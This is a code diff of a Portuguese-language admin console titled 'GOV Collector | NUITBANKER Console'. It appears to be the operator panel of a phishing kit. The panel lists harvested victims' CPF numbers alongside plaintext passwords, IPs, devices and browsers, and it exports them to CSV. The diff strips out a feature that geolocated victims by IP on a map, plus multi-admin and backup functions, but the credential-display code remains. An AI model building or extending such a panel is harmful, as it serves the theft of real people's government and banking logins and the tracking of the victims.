@@ -6,9 +6,6 @@
     <title>GOV Collector | NUITBANKER Console</title>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <!-- Leaflet CSS para o mapa -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
         * {
             margin: 0;
@@ -260,11 +257,6 @@
             border: 1px solid rgba(239, 68, 68, 0.2);
             color: #f87171;
         }
-        .alert-success {
-            background: rgba(16, 185, 129, 0.1);
-            border: 1px solid rgba(16, 185, 129, 0.2);
-            color: #10b981;
-        }
         .form-group {
             margin-bottom: 16px;
         }
@@ -274,7 +266,7 @@
             font-size: 12px;
             margin-bottom: 6px;
         }
-        input, select {
+        input {
             width: 100%;
             padding: 12px 14px;
             background: rgba(255, 255, 255, 0.05);
@@ -284,7 +276,7 @@
             font-family: 'Outfit', sans-serif;
             font-size: 14px;
         }
-        input:focus, select:focus {
+        input:focus {
             outline: none;
             border-color: rgba(255, 255, 255, 0.2);
             background: rgba(255, 255, 255, 0.08);
@@ -312,14 +304,6 @@
         .btn-primary:hover {
             background: linear-gradient(135deg, #ffffff 0%, #f5f5f5 100%);
             transform: translateY(-1px);
-        }
-        .btn-secondary {
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            color: #fff;
-        }
-        .btn-secondary:hover {
-            background: rgba(255, 255, 255, 0.15);
         }
         .security-badge {
             display: flex;
@@ -425,7 +409,6 @@
         .header-actions {
             display: flex;
             gap: 12px;
-            flex-wrap: wrap;
         }
         .logout-btn {
             background: rgba(255, 255, 255, 0.05);
@@ -480,7 +463,6 @@
             cursor: pointer;
             border-radius: 8px;
             font-size: 13px;
-            transition: all 0.2s;
         }
         .tab:hover {
             border-color: rgba(255, 255, 255, 0.15);
@@ -506,11 +488,6 @@
             padding-bottom: 12px;
             border-bottom: 1px solid rgba(255, 255, 255, 0.06);
             color: rgba(255, 255, 255, 0.8);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 10px;
         }
         .table-wrapper {
             overflow-x: auto;
@@ -518,7 +495,6 @@
         table {
             width: 100%;
             border-collapse: collapse;
-            min-width: 600px;
         }
         th, td {
             padding: 12px 10px;
@@ -533,7 +509,6 @@
         td {
             color: rgba(255, 255, 255, 0.7);
             font-size: 13px;
-            word-break: break-word;
         }
         .badge {
             display: inline-block;
@@ -565,10 +540,6 @@
             color: #f87171;
             cursor: pointer;
             font-size: 12px;
-            transition: all 0.2s;
-        }
-        .btn-danger:hover {
-            background: rgba(239, 68, 68, 0.3);
         }
         .btn-clear {
             background: rgba(245, 158, 11, 0.15);
@@ -577,10 +548,6 @@
             border-radius: 8px;
             color: #f59e0b;
             cursor: pointer;
-            transition: all 0.2s;
-        }
-        .btn-clear:hover {
-            background: rgba(245, 158, 11, 0.3);
         }
         .search-box {
             display: flex;
@@ -650,62 +617,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* Estilos do mapa */
-        .map-container {
-            background: rgba(0, 0, 0, 0.6);
-            border-radius: 14px;
-            padding: 20px;
-            margin-top: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-        }
-        #userMap {
-            height: 350px;
-            width: 100%;
-            border-radius: 12px;
-            z-index: 10;
-            background: #1a1a2e;
-        }
-        .location-info {
-            display: flex;
-            gap: 15px;
-            flex-wrap: wrap;
-            margin-top: 15px;
-        }
-        .location-card {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
-            padding: 12px 16px;
-            flex: 1;
-            min-width: 140px;
-        }
-        .location-card i {
-            color: #10b981;
-            margin-right: 8px;
-        }
-        .location-card .label {
-            color: rgba(255, 255, 255, 0.5);
-            font-size: 10px;
-            display: block;
-        }
-        .location-card .value {
-            color: #fff;
-            font-size: 12px;
-            font-weight: 500;
-            margin-top: 4px;
-        }
-        .ip-highlight {
-            cursor: pointer;
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-            background: rgba(16, 185, 129, 0.1);
-            padding: 4px 8px;
-            border-radius: 6px;
-        }
-        .ip-highlight:hover {
-            background: rgba(16, 185, 129, 0.2);
-        }
-
         @media (max-width: 768px) {
             .sidebar {
                 transform: translateX(-100%);
@@ -761,16 +672,6 @@
             .menu-toggle i {
                 color: white;
                 font-size: 20px;
-            }
-            .section-title {
-                flex-direction: column;
-                align-items: flex-start;
-            }
-            #userMap {
-                height: 250px;
-            }
-            .location-card {
-                min-width: 100%;
             }
         }
 
@@ -911,9 +812,9 @@
         <!-- Usuários Tab -->
         <div id="tabUsers" class="tab-content">
             <div class="section-card">
-                <div class="section-title">
+                <div class="section-title" style="display: flex; justify-content: space-between; align-items: center;">
                     <span>LISTA DE USUÁRIOS COLETADOS</span>
-                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                    <div style="display: flex; gap: 10px;">
                         <div class="search-box">
                             <i class="fas fa-search"></i>
                             <input type="text" id="searchUsers" placeholder="Buscar CPF..." onkeyup="filterUsers()">
@@ -931,19 +832,6 @@
                     </table>
                 </div>
             </div>
-            <!-- Mapa do Usuário -->
-            <div class="section-card" id="userMapSection" style="display: none;">
-                <div class="section-title">
-                    <i class="fas fa-map-marker-alt"></i> LOCALIZAÇÃO: <span id="selectedUserCpf"></span>
-                    <button onclick="fecharMapaUsuario()" style="background: none; border: none; color: #f87171; cursor: pointer;">
-                        <i class="fas fa-times"></i> Fechar
-                    </button>
-                </div>
-                <div class="map-container">
-                    <div id="userMap"></div>
-                    <div id="userLocationInfo" class="location-info"></div>
-                </div>
-            </div>
         </div>
 
         <!-- Logs Tab -->
@@ -951,7 +839,7 @@
             <div class="section-card">
                 <div class="section-title">
                     HISTÓRICO COMPLETO
-                    <div class="search-box" style="width: auto;">
+                    <div class="search-box" style="float: right; width: auto;">
                         <i class="fas fa-search"></i>
                         <input type="text" id="searchLogs" placeholder="Buscar..." onkeyup="filterLogs()">
                     </div>
@@ -973,45 +861,15 @@
             </div>
         </div>
 
-        <!-- Configurações Tab (MELHORADA) -->
+        <!-- Configurações Tab -->
         <div id="tabSettings" class="tab-content">
             <div class="section-card">
-                <div class="section-title"><i class="fas fa-key"></i> ALTERAR SENHA DO ADMIN</div>
+                <div class="section-title">ALTERAR SENHA DO ADMIN</div>
                 <div style="display: flex; gap: 12px; flex-wrap: wrap;">
-                    <input type="password" id="novaSenhaAdmin" placeholder="Nova senha (mínimo 6 caracteres)" style="flex: 1;">
+                    <input type="password" id="novaSenhaAdmin" placeholder="Nova senha" style="flex: 1;">
                     <button class="btn-primary" style="width: auto; margin-top: 0;" onclick="alterarSenhaAdmin()">ALTERAR SENHA</button>
                 </div>
                 <div id="senhaMsg" style="margin-top: 15px;"></div>
-            </div>
-
-            <div class="section-card">
-                <div class="section-title"><i class="fas fa-user-plus"></i> ADICIONAR NOVO ADMIN</div>
-                <div style="display: flex; gap: 12px; flex-wrap: wrap;">
-                    <input type="text" id="novoAdminUser" placeholder="Nome do usuário" style="flex: 1;">
-                    <input type="password" id="novoAdminPass" placeholder="Senha" style="flex: 1;">
-                    <button class="btn-secondary" style="width: auto; margin-top: 0;" onclick="adicionarAdmin()">ADICIONAR ADMIN</button>
-                </div>
-                <div id="adminMsg" style="margin-top: 15px;"></div>
-            </div>
-
-            <div class="section-card">
-                <div class="section-title"><i class="fas fa-list"></i> LISTA DE ADMINISTRADORES</div>
-                <div class="table-wrapper">
-                    <table>
-                        <thead><tr><th>Usuário</th><th>Ação</th></tr></thead>
-                        <tbody id="adminsTable"></tbody>
-                    </table>
-                </div>
-            </div>
-
-            <div class="section-card">
-                <div class="section-title"><i class="fas fa-database"></i> BACKUP DOS DADOS</div>
-                <div style="display: flex; gap: 12px; flex-wrap: wrap;">
-                    <button class="btn-secondary" style="width: auto; margin-top: 0;" onclick="fazerBackup()"><i class="fas fa-download"></i> BAIXAR BACKUP</button>
-                    <button class="btn-clear" style="width: auto; margin-top: 0;" onclick="restaurarBackup()"><i class="fas fa-upload"></i> RESTAURAR BACKUP</button>
-                </div>
-                <input type="file" id="backupFile" accept=".json" style="display: none;" onchange="processarRestauracao()">
-                <div id="backupMsg" style="margin-top: 15px;"></div>
             </div>
         </div>
 
@@ -1080,8 +938,6 @@
     });
 
     // ========== FUNÇÕES GERAIS ==========
-    let userMap = null;
-
     function toggleSidebar() {
         document.getElementById('sidebar').classList.toggle('open');
     }
@@ -1161,7 +1017,6 @@
                 document.getElementById('adminPanel').classList.add('visible');
                 initSidebar();
                 loadAllData();
-                carregarAdmins();
                 if (refreshInterval) clearInterval(refreshInterval);
                 refreshInterval = setInterval(() => { if (adminToken) loadAllData(); }, 10000);
                 showToast(`Welcome back, ${username}!`, 'success');
@@ -1192,7 +1047,7 @@
         adminToken = sessionStorage.getItem('adminToken');
         document.getElementById('loginScreen').style.display = 'none';
         document.getElementById('adminPanel').classList.add('visible');
-        setTimeout(() => { initSidebar(); loadAllData(); carregarAdmins(); }, 100);
+        setTimeout(() => { initSidebar(); loadAllData(); }, 100);
         refreshInterval = setInterval(() => { if (adminToken) loadAllData(); }, 10000);
     }
 
@@ -1205,69 +1060,11 @@
         return cpf;
     }
 
-    // Função para buscar localização por IP
-    function buscarLocalizacaoPorIP(ip, callback) {
-        fetch(`https://ipapi.co/${ip}/json/`)
-            .then(res => res.json())
-            .then(data => callback(data))
-            .catch(() => callback(null));
-    }
-
-    // Mostrar localização do usuário
-    function mostrarLocalizacaoUsuario(cpf, ip) {
-        if (!ip || ip === '-' || ip === 'unknown') {
-            showToast(`Não há IP registrado para o CPF ${formatarCPF(cpf)}`, 'error');
-            return;
-        }
-        
-        document.getElementById('selectedUserCpf').innerHTML = formatarCPF(cpf);
-        document.getElementById('userMapSection').style.display = 'block';
-        
-        if (userMap) userMap.remove();
-        userMap = L.map('userMap').setView([-15.7939, -47.8828], 4);
-        
-        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-            attribution: '&copy; OSM & CartoDB',
-            subdomains: 'abcd',
-            maxZoom: 18
-        }).addTo(userMap);
-        
-        buscarLocalizacaoPorIP(ip, (location) => {
-            const infoDiv = document.getElementById('userLocationInfo');
-            
-            if (location && location.latitude && location.longitude && location.latitude !== 'None') {
-                const lat = location.latitude;
-                const lon = location.longitude;
-                userMap.setView([lat, lon], 13);
-                
-                L.marker([lat, lon]).addTo(userMap)
-                    .bindPopup(`<b>CPF: ${formatarCPF(cpf)}</b><br>IP: ${ip}<br>${location.city || ''}, ${location.region || ''}`)
-                    .openPopup();
-                
-                infoDiv.innerHTML = `
-                    <div class="location-card"><i class="fas fa-id-card"></i><span class="label">CPF</span><span class="value">${formatarCPF(cpf)}</span></div>
-                    <div class="location-card"><i class="fas fa-network-wired"></i><span class="label">IP</span><span class="value"><code>${ip}</code></span></div>
-                    <div class="location-card"><i class="fas fa-map-pin"></i><span class="label">Localização</span><span class="value">${location.city || 'N/A'}, ${location.region || 'N/A'}</span></div>
-                    <div class="location-card"><i class="fas fa-globe"></i><span class="label">País</span><span class="value">${location.country_name || 'N/A'}</span></div>
-                    <div class="location-card"><i class="fas fa-chart-line"></i><span class="label">Coordenadas</span><span class="value">${lat}, ${lon}</span></div>
-                    <div class="location-card"><i class="fas fa-building"></i><span class="label">ISP</span><span class="value">${location.org || location.asn || 'N/A'}</span></div>
-                `;
-            } else {
-                infoDiv.innerHTML = `<div class="location-card"><i class="fas fa-exclamation-triangle"></i><span class="value">Não foi possível localizar o IP ${ip}</span></div>`;
-            }
-        });
-    }
-
-    function fecharMapaUsuario() {
-        document.getElementById('userMapSection').style.display = 'none';
-        if (userMap) userMap.remove();
-        userMap = null;
-    }
-
     // ========== CARREGAR DADOS ==========
     async function loadAllData() {
         if (!adminToken) return;
         try {
+            // Stats
             const statsRes = await fetch('/api/admin/stats', { headers: { 'Authorization': `Bearer ${adminToken}` } });
             const statsData = await statsRes.json();
             const stats = statsData.stats || {};
@@ -1276,17 +1073,20 @@
             document.getElementById('statTotalLogs').innerText = stats.total_logs || 0;
             document.getElementById('statTentativas').innerText = stats.tentativas_admin || 0;
 
+            // Usuários
             const usersRes = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${adminToken}` } });
             const usersData = await usersRes.json();
             allUsers = usersData.users || [];
             renderUsers(allUsers);
 
+            // Logs
             const logsRes = await fetch('/api/admin/logs', { headers: { 'Authorization': `Bearer ${adminToken}` } });
             const logsData = await logsRes.json();
             allLogs = logsData.logs || [];
             renderLogs(allLogs);
             renderUltimasAtividades(allLogs.slice(0, 15));
 
+            // Tentativas
             const tentativasRes = await fetch('/api/admin/tentativas', { headers: { 'Authorization': `Bearer ${adminToken}` } });
             const tentativasData = await tentativasRes.json();
             renderTentativas(tentativasData.tentativas || []);
@@ -1302,20 +1102,17 @@
             tbody.innerHTML = '<tr><td colspan="7" style="text-align:center">Nenhum dado coletado</td></tr>';
             return;
         }
-        tbody.innerHTML = users.map(u => {
-            const ip = u.ip || u.ip_senha || '-';
-            return `
-                <tr>
-                    <td><strong>${formatarCPF(u.cpf)}</strong></td>
-                    <td class="badge-warning" style="font-family: monospace;">${u.senha || '--------'}</td>
-                    <td class="ip-highlight" onclick="mostrarLocalizacaoUsuario('${u.cpf}', '${ip}')"><code>${ip}</code> <i class="fas fa-map-marker-alt"></i></td>
-                    <td>${u.dispositivo || u.dispositivo_senha || '-'}</td>
-                    <td>${u.navegador || u.navegador_senha || '-'}</td>
-                    <td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td>
-                    <td><button class="btn-danger" onclick="deletarUsuario('${u.cpf}')">DEL</button></td>
-                </tr>
-            `;
-        }).join('');
+        tbody.innerHTML = users.map(u => `
+            <tr>
+                <td><strong>${formatarCPF(u.cpf)}</strong></td>
+                <td class="badge-warning" style="font-family: monospace;">${u.senha || '--------'}</td>
+                <td>${u.ip || u.ip_senha || '-'}</td>
+                <td>${u.dispositivo || u.dispositivo_senha || '-'}</td>
+                <td>${u.navegador || u.navegador_senha || '-'}</td>
+                <td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td>
+                <td><button class="btn-danger" onclick="deletarUsuario('${u.cpf}')">DEL</button></td>
+            </tr>
+        `).join('');
     }
 
     function renderLogs(logs) {
@@ -1420,148 +1217,11 @@
         showToast('CSV exportado', 'success');
     }
 
-    function fazerBackup() {
-        const backup = {
-            usuarios: allUsers,
-            logs: allLogs,
-            data: new Date().toISOString()
-        };
-        const blob = new Blob([JSON.stringify(backup, null, 2)], { type: 'application/json' });
-        const link = document.createElement('a');
-        link.href = URL.createObjectURL(blob);
-        link.download = `gov_backup_${new Date().toISOString().slice(0,19)}.json`;
-        link.click();
-        showToast('Backup gerado com sucesso!', 'success');
-    }
-
-    function restaurarBackup() {
-        document.getElementById('backupFile').click();
-    }
-
-    function processarRestauracao(event) {
-        const file = document.getElementById('backupFile').files[0];
-        if (!file) return;
-        
-        const reader = new FileReader();
-        reader.onload = async function(e) {
-            try {
-                const backup = JSON.parse(e.target.result);
-                if (backup.usuarios && backup.logs) {
-                    // Enviar para o servidor restaurar
-                    const res = await fetch('/api/admin/restore', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Authorization': `Bearer ${adminToken}`
-                        },
-                        body: JSON.stringify(backup)
-                    });
-                    if (res.ok) {
-                        showToast('Backup restaurado com sucesso!', 'success');
-                        loadAllData();
-                    } else {
-                        showToast('Erro ao restaurar backup', 'error');
-                    }
-                } else {
-                    showToast('Arquivo inválido', 'error');
-                }
-            } catch (error) {
-                showToast('Erro ao processar backup', 'error');
-            }
-        };
-        reader.readAsText(file);
-    }
-
-    async function carregarAdmins() {
-        if (!adminToken) return;
-        try {
-            const res = await fetch('/api/admin/list', {
-                headers: { 'Authorization': `Bearer ${adminToken}` }
-            });
-            const data = await res.json();
-            const tbody = document.getElementById('adminsTable');
-            if (data.admins && data.admins.length) {
-                tbody.innerHTML = data.admins.map(admin => `
-                    <tr>
-                        <td><i class="fas fa-user-shield"></i> ${admin.username}</td>
-                        <td>${admin.username !== 'admin' ? `<button class="btn-danger" onclick="removerAdmin('${admin.username}')">REMOVER</button>` : '<span class="badge">Principal</span>'}</td>
-                    </tr>
-                `).join('');
-            } else {
-                tbody.innerHTML = '<tr><td colspan="2">Nenhum admin encontrado</td></tr>';
-            }
-        } catch (error) {
-            console.error('Erro ao carregar admins:', error);
-        }
-    }
-
-    async function adicionarAdmin() {
-        const username = document.getElementById('novoAdminUser').value.trim();
-        const password = document.getElementById('novoAdminPass').value.trim();
-        const msgDiv = document.getElementById('adminMsg');
-        
-        if (!username || !password || password.length < 6) {
-            msgDiv.innerHTML = '<span style="color: #f87171;">❌ Usuário e senha (mínimo 6 caracteres) são obrigatórios</span>';
-            setTimeout(() => msgDiv.innerHTML = '', 3000);
-            return;
-        }
-        
-        try {
-            const res = await fetch('/api/admin/add', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Authorization': `Bearer ${adminToken}`
-                },
-                body: JSON.stringify({ username, password })
-            });
-            const data = await res.json();
-            if (data.success) {
-                msgDiv.innerHTML = '<span style="color: #10b981;">✅ Admin adicionado com sucesso!</span>';
-                document.getElementById('novoAdminUser').value = '';
-                document.getElementById('novoAdminPass').value = '';
-                carregarAdmins();
-                setTimeout(() => msgDiv.innerHTML = '', 3000);
-            } else {
-                msgDiv.innerHTML = `<span style="color: #f87171;">❌ ${data.error}</span>`;
-                setTimeout(() => msgDiv.innerHTML = '', 3000);
-            }
-        } catch (error) {
-            msgDiv.innerHTML = '<span style="color: #f87171;">❌ Erro ao adicionar admin</span>';
-            setTimeout(() => msgDiv.innerHTML = '', 3000);
-        }
-    }
-
-    async function removerAdmin(username) {
-        if (username === 'admin') {
-            showToast('Não é possível remover o admin principal!', 'error');
-            return;
-        }
-        if (!confirm(`Remover admin ${username}?`)) return;
-        
-        try {
-            const res = await fetch(`/api/admin/remove/${username}`, {
-                method: 'DELETE',
-                headers: { 'Authorization': `Bearer ${adminToken}` }
-            });
-            const data = await res.json();
-            if (data.success) {
-                showToast('Admin removido!', 'success');
-                carregarAdmins();
-            } else {
-                showToast(data.error || 'Erro ao remover', 'error');
-            }
-        } catch (error) {
-            showToast('Erro ao remover admin', 'error');
-        }
-    }
-
     async function alterarSenhaAdmin() {
         const novaSenha = document.getElementById('novaSenhaAdmin').value;
         const msgDiv = document.getElementById('senhaMsg');
         if (!novaSenha || novaSenha.length < 6) {
             msgDiv.innerHTML = '<span style="color: #f87171;">❌ Senha deve ter pelo menos 6 caracteres</span>';
-            setTimeout(() => msgDiv.innerHTML = '', 3000);
             return;
         }
         try {
@@ -1580,11 +1240,9 @@
                 setTimeout(() => msgDiv.innerHTML = '', 3000);
             } else {
                 msgDiv.innerHTML = `<span style="color: #f87171;">❌ ${data.error}</span>`;
-                setTimeout(() => msgDiv.innerHTML = '', 3000);
             }
         } catch (error) {
             msgDiv.innerHTML = '<span style="color: #f87171;">❌ Erro ao alterar senha</span>';
-            setTimeout(() => msgDiv.innerHTML = '', 3000);
         }
     }
 </script>
